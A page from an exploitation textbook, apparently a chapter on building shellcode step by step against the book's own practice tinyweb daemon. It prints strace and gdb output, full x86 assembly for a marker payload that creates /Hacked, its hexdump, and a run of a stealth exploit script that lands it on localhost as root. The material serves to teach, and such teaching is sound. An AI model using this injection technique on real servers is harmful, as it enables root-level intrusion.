<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x651 One Step at a Time</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part139.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part141.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark127">0x651 One Step at a Time</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Complex exploits are difficult because so many different things can go wrong, with no indication of the root cause. Since it can take hours just to track down where the error occurred, it’s usually better to break a complex exploit down into smaller parts. The end goal is a piece of shellcode that will spawn a shell yet keep the tinyweb server running. The shell is interactive, which causes some complications, so let’s deal with that later. For now, the first step should be figuring out how to put the tinyweb daemon back together after exploit- ing it. Let’s begin by writing a piece of shellcode that does something to prove it ran and then puts the tinyweb daemon back together so it can process fur- ther web requests.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Since the tinyweb daemon redirects standard out to /dev/null, writing to standard out isn’t a reliable marker for shellcode. One simple way to prove the shellcode ran is to create a file. This can be done by making a call to <span class="s31">open()</span>, and then <span class="s31">close()</span>. Of course, the <span class="s31">open() </span>call will need the appropriate flags to create a file. We could look through the include files to figure out what <span class="s31">O_CREAT </span>and all the other necessary defines actually are and do all the bitwise math for the arguments, but that’s sort of a pain in the ass. If you recall, we’ve done something like this already—the notetaker program makes a call to <span class="s31">open() </span>which will create a file if it didn’t exist. The strace program can be used on</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">any program to show every system call it makes. In the output below, this is used to verify that the arguments to <span class="s31">open() </span>in C match up with the raw sys- tem calls.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1031.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ strace ./notetaker test execve(&quot;./notetaker&quot;, [&quot;./notetaker&quot;, &quot;test&quot;], [/* 27 vars */]) = 0 brk(0)                   = 0x804a000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)   = -1 ENOENT (No such file or directory) mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">access(&quot;/etc/ld.so.preload&quot;, R_OK)    = -1 ENOENT (No such file or directory) open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)    = 3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fstat64(3, {st_mode=S_IFREG|0644, st_size=70799, ..}) = 0 mmap2(NULL, 70799, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd3000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">close(3)                 = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)    = -1 ENOENT (No such file or directory) open(&quot;/lib/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = 3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0`\1\000&quot;.., 512) = 512 fstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ..}) = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">mmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e92000 mmap2(0xb7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13b) =</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fcd000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mmap2(0xb7fd0000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb7fd0000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">close(3)                 = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e91000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7e916c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 mprotect(0xb7fcd000, 4096, PROT_READ)  = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">munmap(0xb7fd3000, 70799)       = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">brk(0)                  = 0x804a000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">brk(0x806b000)             = 0x806b000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(1, &quot;[DEBUG] buffer  @ 0x804a008: \&#39;t&quot;.., 37[DEBUG] buffer  @ 0x804a008: &#39;test&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">) = 37</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(1, &quot;[DEBUG] datafile @ 0x804a070: \&#39;/&quot;.., 43[DEBUG] datafile @ 0x804a070: &#39;/var/notes&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">) = 43</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">open(&quot;/var/notes&quot;, O_WRONLY|O_APPEND|O_CREAT, 0600) = -1 EACCES (Permission denied)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">dup(2)                  = 3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">fcntl64(3, F_GETFL)          = 0x2 (flags O_RDWR) fstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe3000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">_llseek(3, 0, 0xbffff4e4, SEEK_CUR)  = -1 ESPIPE (Illegal seek)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(3, &quot;[!!] Fatal Error in main() while&quot;.., 65[!!] Fatal Error in main() while opening file: Permission denied</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">) = 65</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">close(3)                 = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">munmap(0xb7fe3000, 4096)       = 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">exit_group(-1)             = ?</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Process 21473 detached</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ grep open notetaker.c</p><p class="s31" style="padding-left: 87pt;text-indent: -29pt;line-height: 107%;text-align: left;">fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR); fatal(&quot;in main() while opening file&quot;);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1032.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">When run through strace, the notetaker binary’s suid-bit isn’t used, so it doesn’t have permission to open the data file. That doesn’t matter, though; we just want to make sure the arguments to the <span class="s31">open() </span>system call match the arguments to the <span class="s31">open() </span>call in C. Since they match, we can safely use the values passed to the <span class="s31">open() </span>function in the notetaker binary as the arguments for the <span class="s31">open() </span>system call in our shellcode. The compiler has already done all the work of looking up the defines and mashing them together with a bitwise OR oper- ation; we just need to find the call arguments in the disassembly of the note- taker binary.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1033.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./notetaker</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) set dis intel</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) disass main</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Dump of assembler code for function main: 0x0804875f &lt;main+0&gt;:  push  ebp 0x08048760 &lt;main+1&gt;:  mov  ebp,esp 0x08048762 &lt;main+3&gt;:  sub  esp,0x28</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">0x08048765 &lt;main+6&gt;:  and  esp,0xfffffff0 0x08048768 &lt;main+9&gt;:  mov  eax,0x0 0x0804876d &lt;main+14&gt;:  sub  esp,eax</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">0x0804876f &lt;main+16&gt;:  mov  DWORD PTR [esp],0x64 0x08048776 &lt;main+23&gt;:  call  0x8048601 &lt;ec_malloc&gt; 0x0804877b &lt;main+28&gt;:  mov  DWORD PTR [ebp-12],eax 0x0804877e &lt;main+31&gt;:  mov  DWORD PTR [esp],0x14 0x08048785 &lt;main+38&gt;:  call  0x8048601 &lt;ec_malloc&gt; 0x0804878a &lt;main+43&gt;:  mov  DWORD PTR [ebp-16],eax 0x0804878d &lt;main+46&gt;:  mov  DWORD PTR [esp+4],0x8048a9f 0x08048795 &lt;main+54&gt;:  mov  eax,DWORD PTR [ebp-16] 0x08048798 &lt;main+57&gt;:  mov  DWORD PTR [esp],eax 0x0804879b &lt;main+60&gt;:  call  0x8048480 &lt;strcpy@plt&gt; 0x080487a0 &lt;main+65&gt;:  cmp  DWORD PTR [ebp+8],0x1 0x080487a4 &lt;main+69&gt;:  jg  0x80487ba &lt;main+91&gt; 0x080487a6 &lt;main+71&gt;:  mov  eax,DWORD PTR [ebp-16] 0x080487a9 &lt;main+74&gt;:  mov  DWORD PTR [esp+4],eax 0x080487ad &lt;main+78&gt;:  mov  eax,DWORD PTR [ebp+12] 0x080487b0 &lt;main+81&gt;:  mov  eax,DWORD PTR [eax] 0x080487b2 &lt;main+83&gt;:  mov  DWORD PTR [esp],eax 0x080487b5 &lt;main+86&gt;:  call  0x8048733 &lt;usage&gt; 0x080487ba &lt;main+91&gt;:  mov  eax,DWORD PTR [ebp+12] 0x080487bd &lt;main+94&gt;:  add  eax,0x4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">0x080487c0 &lt;main+97&gt;:  mov  eax,DWORD PTR [eax] 0x080487c2 &lt;main+99&gt;:  mov  DWORD PTR [esp+4],eax 0x080487c6 &lt;main+103&gt;: mov  eax,DWORD PTR [ebp-12] 0x080487c9 &lt;main+106&gt;: mov  DWORD PTR [esp],eax 0x080487cc &lt;main+109&gt;: call  0x8048480 &lt;strcpy@plt&gt; 0x080487d1 &lt;main+114&gt;: mov  eax,DWORD PTR [ebp-12] 0x080487d4 &lt;main+117&gt;: mov  DWORD PTR [esp+8],eax 0x080487d8 &lt;main+121&gt;: mov  eax,DWORD PTR [ebp-12] 0x080487db &lt;main+124&gt;: mov  DWORD PTR [esp+4],eax 0x080487df &lt;main+128&gt;: mov  DWORD PTR [esp],0x8048aaa 0x080487e6 &lt;main+135&gt;: call  0x8048490 &lt;printf@plt&gt; 0x080487eb &lt;main+140&gt;: mov  eax,DWORD PTR [ebp-16]</p><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080487ee</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+143&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp+8],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x080487f2</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+147&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">eax,DWORD</p></td><td style="width:68pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PTR [ebp-16]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080487f5</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+150&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x080487f9</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+154&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[esp],0x8048ac7</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048800</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+161&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">call</p></td><td style="width:47pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x8048490</p></td><td style="width:68pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048805</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+166&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp+8],0x180</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x0804880d</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+174&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[esp+4],0x441</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048815</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+182&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: right;">eax,DWORD</p></td><td style="width:68pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PTR [ebp-16]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048818</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+185&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:47pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">DWORD PTR</p></td><td style="width:68pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[esp],eax</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x0804881b</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+188&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">call</p></td><td style="width:47pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x8048410</p></td><td style="width:68pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;open@plt&gt;</p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---q Quit</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1034.png"/></span></p><p class="s31" style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;"><span class="p">Remember that the arguments to a function call will be pushed to the stack in reverse. In this case, the compiler decided to use </span>mov DWORD PTR [esp+<i>offset</i>], <i>value_to_push_to_stack </i><span class="p">instead of </span>push <span class="p">instructions, but the structure built on the stack is equivalent. The first argument is a pointer to the name of the file in EAX, the second argument (</span>put at [esp+4]<span class="p">) is </span>0x441<span class="p">, and the third argument (</span>put at [esp+8]<span class="p">) is </span>0x180<span class="p">. This means that </span>O_WRONLY| O_CREAT|O_APPEND <span class="p">turns out to be </span>0x441 <span class="p">and </span>S_IRUSR|S_IWUSR <span class="p">is 0x180. The following shellcode uses these values to create a file called Hacked in the root filesystem.</span></p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">mark.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1035.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;text-align: left;">; Mark the filesystem to prove you ran. jmp short one</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">two:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ebx      ; Filename xor ecx, ecx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE [ebx+7], cl ; Null terminate filename push BYTE 0x5    ; Open()</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD cx, 0x441  ; O_WRONLY|O_APPEND|O_CREAT</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">xor edx, edx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD dx, 0x180  ; S_IRUSR|S_IWUSR</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80       ; Open file to create it.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">; eax = returned file descriptor</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, eax     ; File descriptor to second arg push BYTE 0x6    ; Close ()</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80 ; Close file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">xor eax, eax mov ebx, eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">inc eax  ; Exit call.</p><p class="s31" style="padding-left: 91pt;text-indent: 12pt;line-height: 107%;text-align: left;">int 0x80  ; Exit(0), to avoid an infinite loop. one:</p><p class="s31" style="padding-left: 91pt;text-indent: 12pt;line-height: 107%;text-align: left;">call two db &quot;/HackedX&quot;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">;  01234567</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1036.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The shellcode opens a file to create it and then immediately closes the file. Finally, it calls exit to avoid an infinite loop. The output below shows this new shellcode being used with the exploit tool.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1037.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon. reader@hacking:~/booksrc $ nasm mark.s reader@hacking:~/booksrc $ hexdump -C mark</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000000 eb 23 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.#[1.K.j.Xf.A.1|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 31 c0 |.f.  j.X.1.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 89 c3 40 cd 80 e8 d8 ff ff ff 2f 48 61 63 6b 65 |.@.  /Hacke|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030  64 58                       |dX|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000032</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ls -l /Hacked ls: /Hacked: No such file or directory</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">shellcode: mark (44 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[Fake Request (15 b)] [NOP (357 b)] [shellcode (44 b)] [ret addr (128 b)] localhost [127.0.0.1] 80 (www) open</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ls -l /Hacked</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root reader 0 2007-09-17 16:59 /Hacked reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1038.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part139.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part141.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
